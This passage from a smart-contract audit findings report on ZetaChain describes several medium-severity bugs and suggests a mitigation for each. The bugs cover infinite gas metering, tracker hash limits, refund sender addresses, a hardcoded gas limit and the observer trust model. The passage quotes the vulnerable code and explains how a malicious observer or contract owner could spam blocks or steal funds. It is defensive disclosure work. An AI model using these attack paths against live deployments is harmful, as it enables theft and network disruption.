ZetaChain sets up the ante handler in the [`NewAnteHandler`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/app/ante/ante.go#L56-L119) function and handles transactions differently depending on their type. For example,
[`MsgEthereumTx` Evmos EVM messages require different ante handlers](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/app/ante/ante.go#L75) than regular Cosmos SDK messages.

Specifically, regular Cosmos SDK transactions have their messages checked in lines [`97-112`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/app/ante/ante.go#L97-L112) and if at least one of the messages is a `MsgGasPriceVoter` or `MsgVoteOnObservedInboundTx` message, an [infinite transaction gas meter is used](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/app/ante/handler_options.go#L182).

```go
056: func NewAnteHandler(options ethante.HandlerOptions) (sdk.AnteHandler, error) {
... 		// [...]
092:
093: 		// handle as totally normal Cosmos SDK tx
094: 		switch tx.(type) {
095: 		case sdk.Tx:
096: 			found := false
097: 			for _, msg := range tx.GetMsgs() {
098: 				switch msg.(type) {
099: 				// treat these two msg types differently because they might call EVM which results in massive gas consumption
100: 				// For these two msg types, we don't check gas limit by using a different ante handler
101: 				case *cctxtypes.MsgGasPriceVoter, *cctxtypes.MsgVoteOnObservedInboundTx:
102: 					found = true
103: 					break
104: 				}
105: 			}
106: 			if found {
107: 				// this differs newCosmosAnteHandler only in that it doesn't check gas limit
108: 				// by using an Infinite Gas Meter.
109: 				anteHandler = newCosmosAnteHandlerNoGasLimit(options)
110: 			} else {
111: 				anteHandler = newCosmosAnteHandler(options)
112: 			}
... 		// [...]
119: }
```

The reasoning is that both the `MsgGasPriceVoter` and `MsgVoteOnObservedInboundTx` messages (exclusively limited to observers) interact with the internal zEVM (Evmos), which has a [different gas model (EVM equivalent) than Cosmos SDK](https://docs.evmos.org/protocol/concepts/gas-and-fees). To prevent out-of-gas errors, an infinite gas meter is used.

However, this is problematic as the code in line `97-112` only checks if **at least one** of the messages is a `MsgGasPriceVoter` or `MsgVoteOnObservedInboundTx` message. If the transaction also contains other messages, the same infinite transaction gas meter applies to them as well and the transaction will not run out of gas.

Consequently, a turned-malicious observer can craft a transaction that contains a `MsgGasPriceVoter` or `MsgVoteOnObservedInboundTx` message and **a lot of other messages** that consume a lot of gas. As the infinite transaction gas meter is used, the transaction will be processed without running out of gas. The observer only pays a negligible amount of gas (purposefully set very low) but is able to spam the network and fill up block space, possibly preventing other transactions from being processed if the block gas limit is reached (which is set [by default to *10 million* in CometBFT](https://github.com/cometbft/cometbft/blob/61d508ee2f526ec027ee8fe6ebf3695dafb2d07b/types/params.go#L100)).

Nevertheless, this is a **privilege escalation** as single observes are not supposed to have such a significant impact on the ZetaChain's block space, and thus, medium severity was chosen.

### Recommended mitigation steps

Consider only using the infinite transaction gas meter if **all** of the transaction's messages are of the type `MsgGasPriceVoter` or `MsgVoteOnObservedInboundTx`.

**[DadeKuma (Lookout) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/410#issuecomment-1865354544):**
 > Bundling costly messages before a `MsgGasPriceVoter` (or `MsgVoteOnObservedInboundTx`) may result in infinite gas consumption.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/410#issuecomment-1877003686)**

***

## [[M-11] The outbound transaction tracker only keeps track of a maximum of two different transaction hashes, preventing cctxs from being efficiently confirmed and blocking the outbound transaction queue](https://github.com/code-423n4/2023-11-zetachain-findings/issues/409)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/409), also found by [oakcobalt](https://github.com/code-423n4/2023-11-zetachain-findings/issues/581)*

The outbound transaction queue is potentially blocked by such "stuck" transactions, preventing other pending cctxs from being sent out.

### Proof of Concept

The `AddToOutTxTracker` function, handling the `MsgAddToOutTxTracker` message, adds a transaction hash associated with a pending cctx to the outbound transaction tracker, which is subsequently watched by observers to detect the transaction's inclusion and confirmation in a block. As a result, the [pending cctx is marked as `CctxStatus_OutboundMined`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L153).

This `MsgAddToOutTxTracker` message is sent by observers as soon as the outbound transaction is broadcast. See [zetaclient/evm_signer.go#L585](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L585) and [zetaclient/btc_signer.go#L360](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/btc_signer.go#L360).

However, the `AddToOutTxTracker` function only keeps track of a maximum of two different transaction hashes, as seen in line [`100`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_outtx_tracker.go#L100). Otherwise, the `msg.TxHash` is discarded.

```go
024: func (k msgServer) AddToOutTxTracker(goCtx context.Context, msg *types.MsgAddToOutTxTracker) (*types.MsgAddToOutTxTrackerResponse, error) {
...   // [...]
081:
082: 	var isDup = false
083: 	for _, hash := range tracker.HashList {
084: 		if strings.EqualFold(hash.TxHash, msg.TxHash) {
085: 			isDup = true
086: 			if isProven {
087: 				hash.Proved = true
088: 				k.SetOutTxTracker(ctx, tracker)
089: 				k.Logger(ctx).Info("Proof'd outbound transaction")
090: 				return &types.MsgAddToOutTxTrackerResponse{}, nil
091: 			}
092: 			break
093: 		}
094: 	}
095: 	if !isDup {
096: 		if isProven {
097: 			hash.Proved = true
098: 			tracker.HashList = append([]*types.TxHashList{&hash}, tracker.HashList...)
099: 			k.Logger(ctx).Info("Proof'd outbound transaction")
100: ❌		} else if len(tracker.HashList) < 2 {
101: 			tracker.HashList = append(tracker.HashList, &hash)
102: 		}
103: 		k.SetOutTxTracker(ctx, tracker)
104: 	}
105: 	return &types.MsgAddToOutTxTrackerResponse{}, nil
106: }
```

This is problematic as an outbound cctx, uniquely identified by its nonce, can have multiple different transaction hashes caused by [repeatedly increasing the gas price every epoch](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/abci.go#L115).

As soon as the gas price has been increased and observers broadcast the updated transaction (i.e., replace it in the mempool), the transaction hash will change. As a result, reporting the transaction hash to ZetaChain via the `AddTxHashToOutTxTracker` function call will not keep track of the new transaction hash.

Consequently, the [EVM client's `observeOutTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L561-L629) and the [BTC client's `observeOutTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/bitcoin_client.go#L956) function are not able to query the transaction by the available hashes found in the tracker `HashList`. This results in the outbound cctx being repeatedly processed by the observers, unnecessarily "blocking" other pending cctxs from being sent out (due to [limiting the amount of sent outbound cctx per the 3-second ticker](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L249-L251)).

Only after such a "stuck" transaction is manually added to the outbound transaction tracker via the `AddTxHashToOutTxTracker` function by providing a block inclusion proof, [the correct and up-to-date transaction hash is added to the tracker](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_outtx_tracker.go#L96-L99) and the observers can finally confirm and conclude the cctx. However, this is a separate process and requires (manual) intervention, which might take some time until it is noticed.

### Recommended mitigation steps

Consider keeping track of all transaction hashes associated with a pending cctx instead of limiting it to two hashes.

**[lumtis (ZetaChain) acknowledged](https://github.com/code-423n4/2023-11-zetachain-findings/issues/409#issuecomment-1877796751)**

***

## [[M-12] ERC-20 deposit cctxs are refunded to the EOA instead of an intermediary contract](https://github.com/code-423n4/2023-11-zetachain-findings/issues/408)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/408)*

The EOA is set as the beneficiary of a failed and refunded inbound ERC-20 deposit cctx, instead of a potential intermediary contract. Funds can be stolen from this intermediary contract.

Additionally, but less severe, the [`zContext`'s `origin`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/fungible/keeper/deposits.go#L71) is also set to the EOA.

### Proof of Concept

Observers watch external EVM chains for the `Deposited` event [emitted by the `ERC20Custody.deposit` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L184) on ERC-20 token deposits. Specifically, these logs are processed by calling the `GetInboundVoteMsgForDepositedEvent` function in the following instances:

1.  Observing the inbound transaction tracker, see [node/zetaclient/inbound_tracker.go#L193](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L193)
2.  Querying the EVM chain, see [node/zetaclient/evm_client.go#L894](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L894)

However, in line [`123`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/utils.go#L123), the `MsgVoteOnObservedInboundTx` message's `Sender` is set to the transaction signer EOA address (`sender`) instead of the caller (`msg.sender`) of the `ERC20Custody.deposit` function.

```go
103: func (ob *EVMChainClient) GetInboundVoteMsgForDepositedEvent(event *erc20custody.ERC20CustodyDeposited) (types.MsgVoteOnObservedInboundTx, error) {
...   // [...]
115: 	signer := ethtypes.NewLondonSigner(big.NewInt(ob.chain.ChainId))
116: 	sender, err := signer.Sender(tx)
117: 	if err != nil {
118: 		ob.logger.ExternalChainWatcher.Error().Err(err).Msg(fmt.Sprintf("can't recover the sender from the tx hash: %s", event.Raw.TxHash.Hex()))
119: 		return types.MsgVoteOnObservedInboundTx{}, errors.Wrap(err, fmt.Sprintf("can't recover the sender from the tx hash: %s", event.Raw.TxHash.Hex()))
120:
121: 	}
122: 	return *GetInBoundVoteMessage(
123: ❌ 		sender.Hex(),
124: 		ob.chain.ChainId,
125: 		"",
126: 		clienttypes.BytesToEthHex(event.Recipient),
127: 		common.ZetaChain().ChainId,
128: 		sdkmath.NewUintFromBigInt(event.Amount),
129: 		hex.EncodeToString(event.Message),
130: 		event.Raw.TxHash.Hex(),
131: 		event.Raw.BlockNumber,
132: 		1_500_000,
133: 		common.CoinType_ERC20,
134: 		event.Asset.String(),
135: 		ob.zetaClient.GetKeys().GetOperatorAddress().String(),
136: 		event.Raw.Index,
137: 	), nil
138: }
```

It is very likely that an intermediary contract deployed on a supported EVM chain is interacting with the `ERC20Custody` contract. In this case, the EOA interacting with this contract and subsequently initiating the deposit of the ERC-20 tokens will be set as the `Sender` address.

If the cctx fails and a refund to the source chain is sent, this [EOA will be the receiver of the funds](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L159). Depending on the business logic of the intermediary contract, this allows an EOA to steal its funds.

An inbound cctx can fail for various reasons, but most importantly, the error has to originate from [node/x/fungible/keeper/deposits.go#L52-L85](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/fungible/keeper/deposits.go#L52-L85). For example, if the[ liquidity cap of the deposited asset is reached](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/fungible/keeper/deposits.go#L60-L62) and the `types.ErrForeignCoinCapReached` error is returned, the cctx is considered failed and a refund is initiated.

### Example

Given the following simple Solidity contract on Ethereum Mainnet that intends to keep user funds in escrow and some time later, allows the owner of the contract to bridge the aggregated escrowed funds to ZetaChain.

The owner calls the `bridge` function. The EOA address will be set as the `Sender` of the `MsgVoteOnObservedInboundTx` message.

If the inbound cctx fails and a refund is initiated, the EOA will receive all the funds. Consequently, the owner is able to steal the escrowed user funds from this contract:

```solidity
contract Escrow {
    ERC20Custody public custody;
    mapping (address => mapping (IERC20 => uint256)) public escrowed;
    address owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    constructor(ERC20Custody custody_, address owner_) {
        custody = custody_;
        owner = owner_;
    }

    function escrow(IERC20 asset, uint256 amount) {
        asset.transferFrom(msg.sender, address(this), amount);

        escrowed[msg.sender][asset] += amount;
    }

    function bridge(
        bytes calldata recipient,
        IERC20 asset,
        uint256 amount,
        bytes calldata message
    ) external onlyOwner {
        asset.approve(address(custody), amount);
        custody.deposit(recipient, asset, amount, message);
    }
}
```

### Recommended mitigation steps

Consider adding the `msg.sender` of the `ERC20Custody.deposit` function as an additional event parameter to the `Deposited` event. This parameter can then be used to set the `Sender` of the `MsgVoteOnObservedInboundTx` message.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/408#issuecomment-1877001075)**

***

## [[M-13] The `Sender` of an outbound cctx originating from the zEVM is potentially set to an incorrect sender address resulting in lost assets during a refund](https://github.com/code-423n4/2023-11-zetachain-findings/issues/407)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/407), also found by [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/285)*

If an intermediary contract is used on the zEVM when interacting with the `ZetaConnectorZEVM` contract or ZRC-20 tokens, potential refunds are sent to the transaction signer instead of the intermediary contract, allowing users to steal assets by crafting a cctx that fails and refunds the assets to them.

Determining the validity of the message call via the [`ZetaInteractor.isValidMessageCall`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaInteractor.sol#L23-L28) modifier is unreliable.

### Proof of Concept

zEVM transactions are post-processed in the [`PostTxProcessing`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L42-L44) function of the `x/crosschain` module. Specifically, the goal is to parse and process `ZetaSent` and ZRC-20 `Withdrawal` events and send them to the corresponding, external receiver chains.

Any emitted `ZetaSent` events are parsed and processed in the [`ProcessZetaSentEvent`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L172-L246) function. Similarly, ZRC-20 `Withdrawal` events are processed in the [`ProcessZRC20WithdrawalEvent`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L112-L170) function.

Both functions create a `MsgVoteOnObservedInboundTx` message in lines [`139-154`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L139-L154) and [`214-228`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L214-L228).

However, the `Sender` is set to the `emittingContract` address in line `141` and `216`, which is [the address of the transaction signer](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L75) (i.e., sender - `tx.origin`). In the very special case that the transaction is a contract creation transaction, the `To` address is set to `nil`, and thus the `Sender` is set to `nil` as well.

In both cases, it is problematic as the cctx's `Sender` is used in case the outbound cctx is reverted and will be [set as the receiver of the refund](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L176). As a result, the refund is potentially sent to the wrong recipient.

Moreover, the [`Sender` is provided to the `ZetaConnectorEth.onReceive`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L479) (or non-eth connector) function as the [`zetaTxSenderAddress`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L53) address. This sender address can be used to implement access protection on the receiving contract by using the [`ZetaInteractor.isValidMessageCall`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/tools/ZetaInteractor.sol#L23-L28) modifier. However, as the `zetaTxSenderAddress` is unreliably set (always to the transaction signer's address), this limits the functionality and prevents the use of an intermediary contract on the zEVM.

Similarly, in the `HandleEVMDeposit` function, [calling the `ProcessLogs` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_deposit.go#L88) to process any logs that are a result of a zEVM deposit, and providing the [`msg.Receiver` (i.e., `to`)](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_deposit.go#L27) as the `emittingContract` address, results in similar issues.

### Summary

Using an intermediary contract on the zEVM that interacts with the `ZetaConnectorZEVM` contract causes refund issues and access protection issues on the receiving contract.

Additionally, interacting with the `ZetaConnectorZEVM` contract on the zEVM, as part of a contract creation transaction, is discouraged and leads to lost assets when attempting to refund a failed cctx. This should be clearly documented to prevent users from losing assets.

### Recommended mitigation steps

Consider using the [`zetaTxSenderAddress` address of the `ZetaSent` event](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/ZetaConnectorZEVM.sol#L69) as well as the [`from` address of the `Withdrawal` event](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/Interfaces.sol#L43) as the `Sender` of the cctx.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/407#issuecomment-1966100936)**

***

## [[M-14] Outbound zEVM cross-chain messages ignore the user-specified gas limit and may fail with an out-of-gas error](https://github.com/code-423n4/2023-11-zetachain-findings/issues/406)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/406), also found by [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/270)*

Cross-chain Zeta messages originating from the zEVM have the user-specified destination gas limit ignored (hardcoded to `90000`), potentially causing the transaction to fail with an out-of-gas error.

As a result, [the cctx is **aborted** without refunding the sender,](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L158-L160) thus causing the sender to lose funds.

### Proof of Concept

zEVM transactions are post-processed in the [`PostTxProcessing`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L42-L44) function of the `x/crosschain` module. Specifically, the goal is to parse and process `ZetaSent` and ZRC-20 `Withdrawal` events and send them to the corresponding external receiver chains.

Any emitted `ZetaSent` events are parsed and processed in the [`ProcessZetaSentEvent`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L172-L246) function. This event is emitted by the [`ZetaConnectorZEVM.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/ZetaConnectorZEVM.sol#L92-L108) function to send a cross-chain message to an external chain. The message input, [`ZetaInterfaces.SendInput`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/ZetaConnectorZEVM.sol#L8-L21), allows the sender to specify the `destinationGasLimit` to ensure sufficient gas is used, in case the cross-chain message, once received by the `onReceive` function of the ZetaConnector contract on the receiver chain (e.g., [`ZetaConnectorEth`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L15) or [`ZetaConnectorNonEth`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L15)) [calls the `destinationAddress`'s `onZetaMessage` function.](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L64-L66)

However, this user-specified gas limit (`destinationGasLimit`) is not used, instead, it is [hardcoded in line `224` to `90000`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L224).

```go
172: func (k Keeper) ProcessZetaSentEvent(ctx sdk.Context, event *connectorzevm.ZetaConnectorZEVMZetaSent, emittingContract ethcommon.Address, txOrigin string) error {
...  	// [...]
212:
213: 	// Bump gasLimit by event index (which is very unlikely to be larger than 1000) to always have different ZetaSent events msgs.
214: 	msg := types.NewMsgVoteOnObservedInboundTx(
215: 		"",
216: 		emittingContract.Hex(),
217: 		senderChain.ChainId,
218: 		txOrigin, toAddr,
219: 		receiverChain.ChainId, /
220: 		amount,
221: 		"",
222: 		event.Raw.TxHash.String(),
223: 		event.Raw.BlockNumber,
224: ❌	90000,
225: 		common.CoinType_Zeta,
226: 		"",
227: 		event.Raw.Index,
228: 	)
229: 	sendHash := msg.Digest()
230:
231: 	// Create the CCTX
232: 	cctx := k.CreateNewCCTX(ctx, msg, sendHash, tss.TssPubkey, types.CctxStatus_PendingOutbound, &senderChain, receiverChain)
...  	// [...]
246: }
```

*Please note that the observer's [EVM signer lower-bounds the gas limit to `100k`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L375-L378).*

As the transactions gas limit is set to `90k`, and subsequently overwritten to the lower bound of `100k`, the transaction potentially fails with an out-of-gas error, preventing the transaction from being processed.

The sender of the cross-chain Zeta message may have anticipated this and thus specified a higher `destinationGasLimit` in the first place to ensure the transaction succeeds, which is unfortunately ignored.

### Recommended mitigation steps

Consider using the user-specified `destinationGasLimit` instead of hardcoding the gas limit to `90000`.

**[lumtis (ZetaChain) acknowledged](https://github.com/code-423n4/2023-11-zetachain-findings/issues/406#issuecomment-1877796377)**

***

## [[M-15] Observer can halt outbound cctxs and steal funds](https://github.com/code-423n4/2023-11-zetachain-findings/issues/404)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/404)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_intx_tracker.go#L49-L53> 

A single observer has too much power over the ZetaChain network, allowing them to halt outbound cctxs and steal funds.

### Proof of Concept

Both the `MsgAddToInTxTracker` and `MsgAddToOutTxTracker` messages allow observers to add a transaction to the tracker without providing Merkle proof to verify if the transaction is valid.

This is a real risk to ZetaChain as a single malicious observer is able to cause significant harm.

For example, the `MsgAddToInTxTracker` message can be misused in the following ways:

1.  Spam with the `InTxTracker` with a lot of transactions: Add transactions that will cause the zetaclients to fail/error while processing them -> this will cause the zetaclient to stop processing other legitimate messages in the `ObserveTrackerSuggestions` function. A tx with a hash that's non-existent [causes the zetaclient to error](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L150-L153) and [stops the current loop iteration of the tracker tx's](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L123-L125)
2.  Add an inbound transaction that does not have one of the [desired contracts as the `tx.To`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/verify_proof.go#L75). This causes the [zetaclients to vote for a "fake" transaction which could forge `Deposit` or `ZetaSent` events](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L156-L169). Consequently, this allows draining funds.

Similarly, [trusting observers to not misbehave with `MsgAddToOutTxTracker` messages ](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_outtx_tracker.go#L34) imposes a trust issue as well.

Moreover, a single malicious observer can mess with the external chain nonces by using the (deprecated) [`MsgNonceVoter` message](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_chain_nonces.go#L145), [halting outbound cctx's due to nonce mismatches](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/cctx_utils.go#L44-L46).

> **Please note:** This submission demonstrates the impact on cctxs while the "A single malicious observer can fill the block space with `MsgGasPriceVoter` messages without proper gas compensation resulting in griefing blocks" submission shows how the **whole** ZetaChain network (not only inbound/outbound cctx's) can be significantly impacted (and griefed) by a single observer.

### Recommended mitigation steps

Re-consider the trust model of the `MsgAddToInTxTracker` and `MsgAddToOutTxTracker` messages and possibly also require a Merkle proof from observers.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/404#issuecomment-1883638224)**

***

## [[M-16] Arbitrary destination gas limit for `CoinType_Zeta` cctxs results in paying lower gas fees](https://github.com/code-423n4/2023-11-zetachain-findings/issues/401)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/401), also found by [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/240)*

Gas fees are underpaid for Zeta token cctx's.

### Proof of Concept

Outbound cctx's are processed, collectively signed, and ultimately sent to the receiver chain by the observers via the [`TryProcessOutTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L309-L594) function.

The gas limit used for the transaction is specified in the cctx's `OutboundTxParams.OutboundTxGasLimit` and [validated in lines `375-382` to ensure the limit is in reasonable bounds](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L375-L382) and to prevent the transaction from failing due to insufficient gas.

Specifically, a lower limit of 100k is enforced in lines [`375-378`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L375-L378):

```go
374: gasLimit := send.GetCurrentOutTxParam().OutboundTxGasLimit
375: if gasLimit < 100_000 {
376: 	gasLimit = 100_000
377: 	logger.Warn().Msgf("gasLimit %d is too low; set to %d", send.GetCurrentOutTxParam().OutboundTxGasLimit, gasLimit)
378: }
```

The fees for such outbound cctxs are paid and deducted from the transfer amount (`InboundTxParams.Amount`) by calling the `PayGasAndUpdateCctx` function in the following instances:

*   Inbound cross-chain cctx: [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L218-L224](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L218-L224)
*   Outbound cctxs that originate from zEVM transactions: [node/x/crosschain/keeper/evm_hooks.go#L234-L240](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L234-L240)
*   Refunding failed cctxs in [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L184-L190](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L184-L190) and [node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L170-L176](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L170-L176)

Cctx's with the coin type `CoinType_Gas` or `CoinType_ERC20` have the `OutboundTxGasLimit` gas limit overwritten by a hardcoded value, see lines [`121`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L121) and [`246`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L246).

